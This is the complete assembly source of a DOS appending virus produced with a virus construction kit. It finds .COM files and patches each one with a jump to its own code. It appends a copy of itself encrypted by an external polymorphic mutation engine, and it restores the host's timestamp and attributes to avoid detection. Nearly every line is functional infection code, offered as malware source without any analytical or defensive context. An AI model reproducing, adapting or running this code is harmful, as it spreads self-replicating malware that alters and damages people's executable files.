

; TESTER.ASM
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by Nowhere Man

virus_type	equ	0			; Appending Virus
is_encrypted	equ	0			; We're not encrypted
tsr_virus	equ	0			; We're not TSR

code		segment byte public 'code'
		assume	cs:code,ds:code,es:code,ss:code
		org	0100h

extrn		ned_end:abs
extrn		nuke_enc_dev:near

main		proc	near
		db	0E9h,00h,00h		; Near jump (for compatibility)
start:		call	find_offset		; Like a PUSH IP
find_offset:	pop	bp			; BP holds old IP
		sub	bp,offset find_offset	; Adjust for length of host

		lea	si,[bp + buffer]	; SI points to original start
		mov	di,0100h		; Push 0100h on to stack for
		push	di			; return to main program
		movsw				; Copy the first two bytes
		movsb				; Copy the third byte

		mov	di,bp			; DI points to start of virus

		mov	bp,sp			; BP points to stack
		sub	sp,128			; Allocate 128 bytes on stack

		mov	ah,02Fh			; DOS get DTA function
		int	021h
		push	bx			; Save old DTA address on stack

		mov	ah,01Ah			; DOS set DTA function
		lea	dx,[bp - 128]		; DX points to buffer on stack
		int	021h

		call	search_files		; Find and infect a file


;		cmp	byte ptr [set_carry],0
;		jne	com_end

		mov	ah,9
		lea	dx,[di + data00]
		int	021h

com_end:	pop	dx			; DX holds original DTA address
		mov	ah,01Ah			; DOS set DTA function
		int	021h

		mov	sp,bp			; Deallocate local buffer

		xor	ax,ax			;
		mov	bx,ax			;
		mov	cx,ax			;
		mov	dx,ax			; Empty out the registers
		mov	si,ax			;
		mov	di,ax			;
		mov	bp,ax			;

		ret				; Return to original program

data00		db	"Test virus successful!",13,10,"$"
main		endp

search_files	proc	near
		lea	dx,[di + com_mask]	; DX points to "*.COM"
		call	find_files		; Try to infect a file
done_searching:	ret				; Return to caller

com_mask	db	"*.COM",0		; Mask for all .COM files
search_files	endp

find_files	proc	near
		push	bp			; Save BP

		mov	ah,02Fh			; DOS get DTA function
		int	021h
		push	bx			; Save old DTA address

		mov	bp,sp			; BP points to local buffer
		sub	sp,128			; Allocate 128 bytes on stack

		push	dx			; Save file mask
		mov	ah,01Ah			; DOS set DTA function
		lea	dx,[bp - 128]		; DX points to buffer
		int	021h

		mov	ah,04Eh			; DOS find first file function
		mov	cx,00100111b		; CX holds all file attributes
		pop	dx			; Restore file mask
find_a_file:	int	021h
		jc	done_finding		; Exit if no files found
		call	infect_file		; Infect the file!
		jnc	done_finding		; Exit if no error
		mov	ah,04Fh			; DOS find next file function
		jmp	short find_a_file	; Try finding another file

done_finding:	mov	sp,bp			; Restore old stack frame
		mov	ah,01Ah			; DOS set DTA function
		pop	dx			; Retrieve old DTA address
		int	021h

		pop	bp			; Restore BP
		ret				; Return to caller
find_files	endp

infect_file	proc	near
		mov	ah,02Fh			; DOS get DTA address function
		int	021h
		mov	si,bx			; SI points to the DTA

		mov	byte ptr [di + set_carry],0  ; Assume we'll fail

		cmp	word ptr [si + 01Ah],(65279 - (finish - start))
		jbe	size_ok			; If it's small enough continue
		jmp	infection_done		; Otherwise exit

size_ok:	mov	ax,03D00h		; DOS open file function, r/o
		lea	dx,[si + 01Eh]		; DX points to file name
		int	021h
		xchg	bx,ax			; BX holds file handle

		mov	ah,03Fh			; DOS read from file function
		mov	cx,3			; CX holds bytes to read (3)
		lea	dx,[di + buffer]	; DX points to buffer
		int	021h

		mov	ax,04202h		; DOS file seek function, EOF
		cwd				; Zero DX _ Zero bytes from end
		mov	cx,dx			; Zero CX /
		int	021h

		xchg	dx,ax			; Faster than a PUSH AX
		mov	ah,03Eh			; DOS close file function
		int	021h
		xchg	dx,ax			; Faster than a POP AX

		sub	ax,finish - start + 3	; Adjust AX for a valid jump
		cmp	byte ptr [di + buffer],0E9h  ; Is there a JMP yet?
		je	infection_done		; If equal then exit
		mov	byte ptr [di + set_carry],1  ; Success -- the file is OK
		add	ax,finish - start	; Re-adjust to make the jump
		mov	word ptr [di + new_jump + 1],ax  ; Construct jump

		mov	ax,04301h		; DOS set file attrib. function
		xor	cx,cx			; Clear all attributes
		lea	dx,[si + 01Eh]		; DX points to victim's name
		int	021h

		mov	ax,03D02h		; DOS open file function, r/w
		int	021h
		xchg	bx,ax			; BX holds file handle

		mov	ah,040h			; DOS write to file function
		mov	cx,3			; CX holds bytes to write (3)
		lea	dx,[di + new_jump]	; DX points to the jump we made
		int	021h

		mov	ax,04202h		; DOS file seek function, EOF
		cwd				; Zero DX _ Zero bytes from end
		mov	cx,dx			; Zero CX /
		int	021h

; Arguments:    AX = offset of buffer to hold data
;		BX = offset of code start
;		CX = offset of the virus in memory (next time around!)
;		DX = length of code to copy and encrypt
;		SI = options:
;			bit 0:	dummy instructions
;			bit 1:	MOV variance
;			bit 2:  ADD/SUB substitution
;			bit 3:  garbage code
;			bit 4:  don't assume DS = CS
;			bits 5-15:  reserved

		push	bx
		push	si

		xchg	cx,ax
		add	cx,0100h
		mov	dx,finish - start
		lea	ax,[di + ned_end]
		lea	bx,[di + start]
		mov	si,0000000000001111b
		call	nuke_enc_dev

		pop	si
		pop	bx

		xchg	cx,ax
		mov	ah,040h
		lea	dx,[di + ned_end]
		int	021h

		mov	ax,05701h		; DOS set file time function
		mov	cx,[si + 016h]		; CX holds old file time
		mov	dx,[si + 018h]		; DX holds old file date
		int	021h

		mov	ah,03Eh			; DOS close file function
		int	021h

		mov	ax,04301h		; DOS set file attrib. function
		xor	ch,ch			; Clear CH for file attribute
		mov	cl,[si + 015h]		; CX holds file's old attributes
		lea	dx,[si + 01Eh]		; DX points to victim's name
		int	021h

infection_done:	cmp	byte ptr [di + set_carry],1  ; Set carry flag if failed
		ret				; Return to caller

set_carry	db	?			; Set-carry-on-exit flag
buffer		db	090h,0CDh,020h		; Buffer to hold old three bytes
new_jump	db	0E9h,?,?		; New jump to virus
infect_file	endp

vcl_marker	db	"[VCL]",0		; VCL creation marker

finish		label	near

code		ends
		end	main
